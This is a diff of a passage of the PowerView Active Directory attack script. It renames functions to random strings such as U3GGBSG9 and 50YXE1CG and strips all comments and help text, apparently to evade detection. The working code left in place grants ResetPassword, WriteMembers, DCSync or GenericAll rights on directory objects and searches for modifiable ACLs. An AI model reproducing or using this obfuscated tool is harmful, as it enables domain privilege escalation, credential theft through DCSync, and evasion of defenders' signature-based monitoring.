         $DomainGUIDMapArguments = @{}
         if ($PSBoundParameters['Domain']) { $DomainGUIDMapArguments['Domain'] = $Domain }
@@ -8144,9 +4793,9 @@ Custom PSObject with ACL entries.
         if ($PSBoundParameters['ServerTimeLimit']) { $DomainGUIDMapArguments['ServerTimeLimit'] = $ServerTimeLimit }
         if ($PSBoundParameters['Credential']) { $DomainGUIDMapArguments['Credential'] = $Credential }
 
-        # get a GUID -> name mapping
+        
         if ($PSBoundParameters['ResolveGUIDs']) {
-            $GUIDs = Get-DomainGUIDMap @DomainGUIDMapArguments
+            $GUIDs = KV9HMWD4 @DomainGUIDMapArguments
         }
     }
 
@@ -8162,14 +4811,14 @@ Custom PSObject with ACL entries.
                 elseif ($IdentityInstance -match '^(CN|OU|DC)=.*') {
                     $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                     if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
-                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
-                        #   and rebuild the domain searcher
+                        
+                        
                         $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
-                        Write-Verbose "[Get-DomainObjectAcl] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
+                        Write-Verbose "[U3GGBSG9Acl] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                         $SearcherArguments['Domain'] = $IdentityDomain
-                        $Searcher = Get-DomainSearcher @SearcherArguments
+                        $Searcher = NJUXTHTL @SearcherArguments
                         if (-not $Searcher) {
-                            Write-Warning "[Get-DomainObjectAcl] Unable to retrieve domain searcher for '$IdentityDomain'"
+                            Write-Warning "[U3GGBSG9Acl] Unable to retrieve domain searcher for '$IdentityDomain'"
                         }
                     }
                 }
@@ -8189,14 +4838,14 @@ Custom PSObject with ACL entries.
             }
 
             if ($PSBoundParameters['LDAPFilter']) {
-                Write-Verbose "[Get-DomainObjectAcl] Using additional LDAP filter: $LDAPFilter"
+                Write-Verbose "[U3GGBSG9Acl] Using additional LDAP filter: $LDAPFilter"
                 $Filter += "$LDAPFilter"
             }
 
             if ($Filter) {
                 $Searcher.filter = "(&$Filter)"
             }
-            Write-Verbose "[Get-DomainObjectAcl] Get-DomainObjectAcl filter string: $($Searcher.filter)"
+            Write-Verbose "[U3GGBSG9Acl] U3GGBSG9Acl filter string: $($Searcher.filter)"
 
             $Results = $Searcher.FindAll()
             $Results | Where-Object {$_} | ForEach-Object {
@@ -8232,7 +4881,7 @@ Custom PSObject with ACL entries.
                         if ($Continue) {
                             $_ | Add-Member NoteProperty 'ActiveDirectoryRights' ([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], $_.AccessMask))
                             if ($GUIDs) {
-                                # if we're resolving GUIDs, map them them to the resolved hash table
+                                
                                 $AclProperties = @{}
                                 $_.psobject.properties | ForEach-Object {
                                     if ($_.Name -match 'ObjectType|InheritedObjectType|ObjectAceType|InheritedObjectAceType') {
@@ -8259,7 +4908,7 @@ Custom PSObject with ACL entries.
                     }
                 }
                 catch {
-                    Write-Verbose "[Get-DomainObjectAcl] Error: $_"
+                    Write-Verbose "[U3GGBSG9Acl] Error: $_"
                 }
             }
         }
@@ -8267,174 +4916,8 @@ Custom PSObject with ACL entries.
 }
 
 
-function Add-DomainObjectAcl {
-<#
-.SYNOPSIS
+function 50YXE1CG {
 
-Adds an ACL for a specific active directory object.
-
-AdminSDHolder ACL approach from Sean Metcalf (@pyrotek3): https://adsecurity.org/?p=1906
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-DomainObject  
-
-.DESCRIPTION
-
-This function modifies the ACL/ACE entries for a given Active Directory
-target object specified by -TargetIdentity. Available -Rights are
-'All', 'ResetPassword', 'WriteMembers', 'DCSync', or a manual extended
-rights GUID can be set with -RightsGUID. These rights are granted on the target
-object for the specified -PrincipalIdentity.
-
-.PARAMETER TargetIdentity
-
-A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
-SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
-for the domain object to modify ACLs for. Required. Wildcards accepted.
-
-.PARAMETER TargetDomain
-
-Specifies the domain for the TargetIdentity to use for the modification, defaults to the current domain.
-
-.PARAMETER TargetLDAPFilter
-
-Specifies an LDAP query string that is used to filter Active Directory object targets.
-
-.PARAMETER TargetSearchBase
-
-The LDAP source to search through for targets, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-Useful for OU queries.
-
-.PARAMETER PrincipalIdentity
-
-A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
-SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
-for the domain principal to add for the ACL. Required. Wildcards accepted.
-
-.PARAMETER PrincipalDomain
-
-Specifies the domain for the TargetIdentity to use for the principal, defaults to the current domain.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER SearchScope
-
-Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER Tombstone
-
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.PARAMETER Rights
-
-Rights to add for the principal, 'All', 'ResetPassword', 'WriteMembers', 'DCSync'.
-Defaults to 'All'.
-
-.PARAMETER RightsGUID
-
-Manual GUID representing the right to add to the target.
-
-.EXAMPLE
-
-$Harmj0ySid = Get-DomainUser harmj0y | Select-Object -ExpandProperty objectsid
-Get-DomainObjectACL dfm.a -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $Harmj0ySid}
-
-...
-
-Add-DomainObjectAcl -TargetIdentity dfm.a -PrincipalIdentity harmj0y -Rights ResetPassword -Verbose
-VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
-VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(samAccountName=harmj0y)))
-VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
-VERBOSE: [Get-DomainObject] Get-DomainObject filter string:(&(|(samAccountName=dfm.a)))
-VERBOSE: [Add-DomainObjectAcl] Granting principal CN=harmj0y,CN=Users,DC=testlab,DC=local 'ResetPassword' on CN=dfm (admin),CN=Users,DC=testlab,DC=local
-VERBOSE: [Add-DomainObjectAcl] Granting principal CN=harmj0y,CN=Users,DC=testlab,DC=local rights GUID '00299570-246d-11d0-a768-00aa006e0529' on CN=dfm (admin),CN=Users,DC=testlab,DC=local
-
-Get-DomainObjectACL dfm.a -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $Harmj0ySid }
-
-AceQualifier           : AccessAllowed
-ObjectDN               : CN=dfm (admin),CN=Users,DC=testlab,DC=local
-ActiveDirectoryRights  : ExtendedRight
-ObjectAceType          : User-Force-Change-Password
-ObjectSID              : S-1-5-21-890171859-3433809279-3366196753-1114
-InheritanceFlags       : None
-BinaryLength           : 56
-AceType                : AccessAllowedObject
-ObjectAceFlags         : ObjectAceTypePresent
-IsCallback             : False
-PropagationFlags       : None
-SecurityIdentifier     : S-1-5-21-890171859-3433809279-3366196753-1108
-AccessMask             : 256
-AuditFlags             : None
-IsInherited            : False
-AceFlags               : None
-InheritedObjectAceType : All
-OpaqueLength           : 0
-
-.EXAMPLE
-
-$Harmj0ySid = Get-DomainUser harmj0y | Select-Object -ExpandProperty objectsid
-Get-DomainObjectACL testuser -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $Harmj0ySid}
-
-[no results returned]
-
-$SecPassword = ConvertTo-SecureString 'Password123!'-AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Add-DomainObjectAcl -TargetIdentity testuser -PrincipalIdentity harmj0y -Rights ResetPassword -Credential $Cred -Verbose
-VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
-VERBOSE: [Get-Domain] Extracted domain 'TESTLAB' from -Credential
-VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
-VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
-VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=harmj0y)(name=harmj0y))))
-VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
-VERBOSE: [Get-Domain] Extracted domain 'TESTLAB' from -Credential
-VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
-VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
-VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=testuser)(name=testuser))))
-VERBOSE: [Add-DomainObjectAcl] Granting principal CN=harmj0y,CN=Users,DC=testlab,DC=local 'ResetPassword' on CN=testuser testuser,CN=Users,DC=testlab,DC=local
-VERBOSE: [Add-DomainObjectAcl] Granting principal CN=harmj0y,CN=Users,DC=testlab,DC=local rights GUID '00299570-246d-11d0-a768-00aa006e0529' on CN=testuser,CN=Users,DC=testlab,DC=local
-
-Get-DomainObjectACL testuser -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $Harmj0ySid }
-
-AceQualifier           : AccessAllowed
-ObjectDN               : CN=dfm (admin),CN=Users,DC=testlab,DC=local
-ActiveDirectoryRights  : ExtendedRight
-ObjectAceType          : User-Force-Change-Password
-ObjectSID              : S-1-5-21-890171859-3433809279-3366196753-1114
-InheritanceFlags       : None
-BinaryLength           : 56
-AceType                : AccessAllowedObject
-ObjectAceFlags         : ObjectAceTypePresent
-IsCallback             : False
-PropagationFlags       : None
-SecurityIdentifier     : S-1-5-21-890171859-3433809279-3366196753-1108
-AccessMask             : 256
-AuditFlags             : None
-IsInherited            : False
-AceFlags               : None
-InheritedObjectAceType : All
-OpaqueLength           : 0
-
-.LINK
-
-https://adsecurity.org/?p=1906
-https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects?forum=winserverpowershell
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [CmdletBinding()]
@@ -8524,7 +5007,7 @@ https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a
         if ($PSBoundParameters['ServerTimeLimit']) { $PrincipalSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
         if ($PSBoundParameters['Tombstone']) { $PrincipalSearcherArguments['Tombstone'] = $Tombstone }
         if ($PSBoundParameters['Credential']) { $PrincipalSearcherArguments['Credential'] = $Credential }
-        $Principals = Get-DomainObject @PrincipalSearcherArguments
+        $Principals = U3GGBSG9 @PrincipalSearcherArguments
         if (-not $Principals) {
             throw "Unable to resolve principal: $PrincipalIdentity"
         }
@@ -8532,7 +5015,7 @@ https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a
 
     PROCESS {
         $TargetSearcherArguments['Identity'] = $TargetIdentity
-        $Targets = Get-DomainObject @TargetSearcherArguments
+        $Targets = U3GGBSG9 @TargetSearcherArguments
 
         ForEach ($TargetObject in $Targets) {
 
@@ -8545,20 +5028,20 @@ https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a
             }
             else {
                 $GUIDs = Switch ($Rights) {
-                    # ResetPassword doesn't need to know the user's current password
+                    
                     'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
-                    # allows for the modification of group membership
+                    
                     'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
-                    # 'DS-Replication-Get-Changes' = 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
-                    # 'DS-Replication-Get-Changes-All' = 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
-                    # 'DS-Replication-Get-Changes-In-Filtered-Set' = 89e95b76-444d-4c62-991a-0facbeda640c
-                    #   when applied to a domain's ACL, allows for the use of DCSync
+                    
+                    
+                    
+                    
                     'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                 }
             }
 
             ForEach ($PrincipalObject in $Principals) {
-                Write-Verbose "[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname)"
+                Write-Verbose "[50YXE1CG] Granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname)"
 
                 try {
                     $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$PrincipalObject.objectsid)
@@ -8571,14 +5054,14 @@ https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a
                         }
                     }
                     else {
-                        # deault to GenericAll rights
+                        
                         $ADRights = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                         $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $InheritanceType
                     }
 
-                    # add all the new ACEs to the specified object directory entry
+                    
                     ForEach ($ACE in $ACEs) {
-                        Write-Verbose "[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname)"
+                        Write-Verbose "[50YXE1CG] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname)"
                         $TargetEntry = $TargetObject.GetDirectoryEntry()
                         $TargetEntry.PsBase.Options.SecurityMasks = 'Dacl'
                         $TargetEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
@@ -8586,7 +5069,7 @@ https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a
                     }
                 }
                 catch {
-                    Write-Verbose "[Add-DomainObjectAcl] Error granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname) : $_"
+                    Write-Verbose "[50YXE1CG] Error granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname) : $_"
                 }
             }
         }
@@ -8594,128 +5077,8 @@ https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a
 }
 
 
-function Remove-DomainObjectAcl {
-<#
-.SYNOPSIS
+function XIR5S4SI {
 
-Removes an ACL from a specific active directory object.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-DomainObject  
-
-.DESCRIPTION
-
-This function modifies the ACL/ACE entries for a given Active Directory
-target object specified by -TargetIdentity. Available -Rights are
-'All', 'ResetPassword', 'WriteMembers', 'DCSync', or a manual extended
-rights GUID can be set with -RightsGUID. These rights are removed from the target
-object for the specified -PrincipalIdentity.
-
-.PARAMETER TargetIdentity
-
-A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
-SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
-for the domain object to modify ACLs for. Required. Wildcards accepted.
-
-.PARAMETER TargetDomain
-
-Specifies the domain for the TargetIdentity to use for the modification, defaults to the current domain.
-
-.PARAMETER TargetLDAPFilter
-
-Specifies an LDAP query string that is used to filter Active Directory object targets.
-
-.PARAMETER TargetSearchBase
-
-The LDAP source to search through for targets, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-Useful for OU queries.
-
-.PARAMETER PrincipalIdentity
-
-A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
-SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
-for the domain principal to add for the ACL. Required. Wildcards accepted.
-
-.PARAMETER PrincipalDomain
-
-Specifies the domain for the TargetIdentity to use for the principal, defaults to the current domain.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER SearchScope
-
-Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER Tombstone
-
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.PARAMETER Rights
-
-Rights to add for the principal, 'All', 'ResetPassword', 'WriteMembers', 'DCSync'.
-Defaults to 'All'.
-
-.PARAMETER RightsGUID
-
-Manual GUID representing the right to add to the target.
-
-.EXAMPLE
-
-$UserSID = Get-DomainUser user | Select-Object -ExpandProperty objectsid
-Get-DomainObjectACL user2 -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $UserSID}
-
-[no results returned]
-
-Add-DomainObjectAcl -TargetIdentity user2 -PrincipalIdentity user -Rights ResetPassword
-
-Get-DomainObjectACL user2 -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $UserSID }
-
-AceQualifier           : AccessAllowed
-ObjectDN               : CN=user2,CN=Users,DC=testlab,DC=local
-ActiveDirectoryRights  : ExtendedRight
-ObjectAceType          : User-Force-Change-Password
-ObjectSID              : S-1-5-21-883232822-274137685-4173207997-2105
-InheritanceFlags       : None
-BinaryLength           : 56
-AceType                : AccessAllowedObject
-ObjectAceFlags         : ObjectAceTypePresent
-IsCallback             : False
-PropagationFlags       : None
-SecurityIdentifier     : S-1-5-21-883232822-274137685-4173207997-2104
-AccessMask             : 256
-AuditFlags             : None
-IsInherited            : False
-AceFlags               : None
-InheritedObjectAceType : All
-OpaqueLength           : 0
-
-
-Remove-DomainObjectAcl -TargetIdentity user2 -PrincipalIdentity user -Rights ResetPassword
-
-Get-DomainObjectACL user2 -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $UserSID}
-
-[no results returned]
-
-.LINK
-
-https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects?forum=winserverpowershell
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [CmdletBinding()]
@@ -8805,7 +5168,7 @@ https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a
         if ($PSBoundParameters['ServerTimeLimit']) { $PrincipalSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
         if ($PSBoundParameters['Tombstone']) { $PrincipalSearcherArguments['Tombstone'] = $Tombstone }
         if ($PSBoundParameters['Credential']) { $PrincipalSearcherArguments['Credential'] = $Credential }
-        $Principals = Get-DomainObject @PrincipalSearcherArguments
+        $Principals = U3GGBSG9 @PrincipalSearcherArguments
         if (-not $Principals) {
             throw "Unable to resolve principal: $PrincipalIdentity"
         }
@@ -8813,7 +5176,7 @@ https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a
 
     PROCESS {
         $TargetSearcherArguments['Identity'] = $TargetIdentity
-        $Targets = Get-DomainObject @TargetSearcherArguments
+        $Targets = U3GGBSG9 @TargetSearcherArguments
 
         ForEach ($TargetObject in $Targets) {
 
@@ -8826,20 +5189,20 @@ https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a
             }
             else {
                 $GUIDs = Switch ($Rights) {
-                    # ResetPassword doesn't need to know the user's current password
+                    
                     'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
-                    # allows for the modification of group membership
+                    
                     'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
-                    # 'DS-Replication-Get-Changes' = 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
-                    # 'DS-Replication-Get-Changes-All' = 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
-                    # 'DS-Replication-Get-Changes-In-Filtered-Set' = 89e95b76-444d-4c62-991a-0facbeda640c
-                    #   when applied to a domain's ACL, allows for the use of DCSync
+                    
+                    
+                    
+                    
                     'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                 }
             }
 
             ForEach ($PrincipalObject in $Principals) {
-                Write-Verbose "[Remove-DomainObjectAcl] Removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname)"
+                Write-Verbose "[XIR5S4SI] Removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname)"
 
                 try {
                     $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$PrincipalObject.objectsid)
@@ -8852,14 +5215,14 @@ https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a
                         }
                     }
                     else {
-                        # deault to GenericAll rights
+                        
                         $ADRights = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                         $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $InheritanceType
                     }
 
-                    # remove all the specified ACEs from the specified object directory entry
+                    
                     ForEach ($ACE in $ACEs) {
-                        Write-Verbose "[Remove-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname)"
+                        Write-Verbose "[XIR5S4SI] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname)"
                         $TargetEntry = $TargetObject.GetDirectoryEntry()
                         $TargetEntry.PsBase.Options.SecurityMasks = 'Dacl'
                         $TargetEntry.PsBase.ObjectSecurity.RemoveAccessRule($ACE)
@@ -8867,7 +5230,7 @@ https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a
                     }
                 }
                 catch {
-                    Write-Verbose "[Remove-DomainObjectAcl] Error removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname) : $_"
+                    Write-Verbose "[XIR5S4SI] Error removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname) : $_"
                 }
             }
         }
@@ -8875,95 +5238,8 @@ https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a
 }
 
 
-function Find-InterestingDomainAcl {
-<#
-.SYNOPSIS
+function DFSAKZW7 {
 
-Finds object ACLs in the current (or specified) domain with modification
-rights set to non-built in objects.
-
-Thanks Sean Metcalf (@pyrotek3) for the idea and guidance.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-DomainObjectAcl, Get-DomainObject, Convert-ADName  
-
-.DESCRIPTION
-
-This function enumerates the ACLs for every object in the domain with Get-DomainObjectAcl,
-and for each returned ACE entry it checks if principal security identifier
-is *-1000 (meaning the account is not built in), and also checks if the rights for
-the ACE mean the object can be modified by the principal. If these conditions are met,
-then the security identifier SID is translated, the domain object is retrieved, and
-additional IdentityReference* information is appended to the output object.
-
-.PARAMETER Domain
-
-Specifies the domain to use for the query, defaults to the current domain.
-
-.PARAMETER ResolveGUIDs
-
-Switch. Resolve GUIDs to their display names.
-
-.PARAMETER LDAPFilter
-
-Specifies an LDAP query string that is used to filter Active Directory objects.
-
-.PARAMETER SearchBase
-
-The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-Useful for OU queries.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER SearchScope
-
-Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER Tombstone
-
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.EXAMPLE
-
-Find-InterestingDomainAcl
-
-Finds interesting object ACLS in the current domain.
-
-.EXAMPLE
-
-Find-InterestingDomainAcl -Domain dev.testlab.local -ResolveGUIDs
-
-Finds interesting object ACLS in the ev.testlab.local domain and
-resolves rights GUIDs to display names.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Find-InterestingDomainAcl -Credential $Cred -ResolveGUIDs
-
-.OUTPUTS
-
-PowerView.ACL
-
-Custom PSObject with ACL entries.
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.ACL')]
@@ -9044,7 +5320,7 @@ Custom PSObject with ACL entries.
         if ($PSBoundParameters['Server']) { $ADNameArguments['Server'] = $Server }
         if ($PSBoundParameters['Credential']) { $ADNameArguments['Credential'] = $Credential }
 
-        # ongoing list of built-up SIDs
+        
         $ResolvedSIDs = @{}
     }
 
@@ -9054,10 +5330,10 @@ Custom PSObject with ACL entries.
             $ADNameArguments['Domain'] = $Domain
         }
 
-        Get-DomainObjectAcl @ACLArguments | ForEach-Object {
+        U3GGBSG9Acl @ACLArguments | ForEach-Object {
 
             if ( ($_.ActiveDirectoryRights -match 'GenericAll|Write|Create|Delete') -or (($_.ActiveDirectoryRights -match 'ExtendedRight') -and ($_.AceQualifier -match 'Allow'))) {
-                # only process SIDs > 1000
+                
                 if ($_.SecurityIdentifier.Value -match '^S-1-5-.*-[1-9]\d{3,}$') {
                     if ($ResolvedSIDs[$_.SecurityIdentifier.Value]) {
                         $IdentityReferenceName, $IdentityReferenceDomain, $IdentityReferenceDN, $IdentityReferenceClass = $ResolvedSIDs[$_.SecurityIdentifier.Value]
@@ -9084,15 +5360,15 @@ Custom PSObject with ACL entries.
                     }
                     else {
                         $IdentityReferenceDN = Convert-ADName -Identity $_.SecurityIdentifier.Value -OutputType DN @ADNameArguments
-                        # "IdentityReferenceDN: $IdentityReferenceDN"
+                        
 
                         if ($IdentityReferenceDN) {
                             $IdentityReferenceDomain = $IdentityReferenceDN.SubString($IdentityReferenceDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
-                            # "IdentityReferenceDomain: $IdentityReferenceDomain"
+                            
                             $ObjectSearcherArguments['Domain'] = $IdentityReferenceDomain
                             $ObjectSearcherArguments['Identity'] = $IdentityReferenceDN
-                            # "IdentityReferenceDN: $IdentityReferenceDN"
-                            $Object = Get-DomainObject @ObjectSearcherArguments
+                            
+                            $Object = U3GGBSG9 @ObjectSearcherArguments
 
                             if ($Object) {
                                 $IdentityReferenceName = $Object.Properties.samaccountname[0]
@@ -9109,7 +5385,7 @@ Custom PSObject with ACL entries.
                                     $IdentityReferenceClass = $Null
                                 }
 
-                                # save so we don't look up more than once
+                                
                                 $ResolvedSIDs[$_.SecurityIdentifier.Value] = $IdentityReferenceName, $IdentityReferenceDomain, $IdentityReferenceDN, $IdentityReferenceClass
 
                                 $InterestingACL = New-Object PSObject
@@ -9134,7 +5410,7 @@ Custom PSObject with ACL entries.
                             }
                         }
                         else {
-                            Write-Warning "[Find-InterestingDomainAcl] Unable to convert SID '$($_.SecurityIdentifier.Value )' to a distinguishedname with Convert-ADName"
+                            Write-Warning "[DFSAKZW7] Unable to convert SID '$($_.SecurityIdentifier.Value )' to a distinguishedname with Convert-ADName"
                         }
                     }
                 }
@@ -9144,124 +5420,8 @@ Custom PSObject with ACL entries.
 }
 
 
-function Get-DomainOU {
-<#
-.SYNOPSIS
+function HM6W17ZN {
 
-Search for all organization units (OUs) or specific OU objects in AD.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty  
-
-.DESCRIPTION
-
-Builds a directory searcher object using Get-DomainSearcher, builds a custom
-LDAP filter based on targeting/filter parameters, and searches for all objects
-matching the criteria. To only return specific properties, use
-"-Properties whencreated,usnchanged,...". By default, all OU objects for
-the current domain are returned.
-
-.PARAMETER Identity
-
-An OU name (e.g. TestOU), DistinguishedName (e.g. OU=TestOU,DC=testlab,DC=local), or
-GUID (e.g. 8a9ba22a-8977-47e6-84ce-8c26af4e1e6a). Wildcards accepted.
-
-.PARAMETER GPLink
-
-Only return OUs with the specified GUID in their gplink property.
-
-.PARAMETER Domain
-
-Specifies the domain to use for the query, defaults to the current domain.
-
-.PARAMETER LDAPFilter
-
-Specifies an LDAP query string that is used to filter Active Directory objects.
-
-.PARAMETER Properties
-
-Specifies the properties of the output object to retrieve from the server.
-
-.PARAMETER SearchBase
-
-The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-Useful for OU queries.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER SearchScope
-
-Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
-
-.PARAMETER ResultPageSize
-
